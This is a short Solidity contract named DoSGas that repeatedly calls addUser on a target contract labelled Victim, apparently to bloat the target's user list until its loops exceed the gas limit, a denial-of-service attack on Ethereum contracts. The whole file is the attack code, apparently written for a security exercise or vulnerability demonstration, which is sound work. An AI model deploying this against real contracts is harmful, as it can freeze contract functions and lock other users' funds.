pragma solidity ^0.4.19;

contract DoSGas {
  function addUsers(address victim, uint256 loops) {
    Victim _victim = Victim(victim);
    while (loops > 0) {
      _victim.addUser(this);
      loops--;
    }
  }
}

contract Victim {
  function addUser(address _user);
}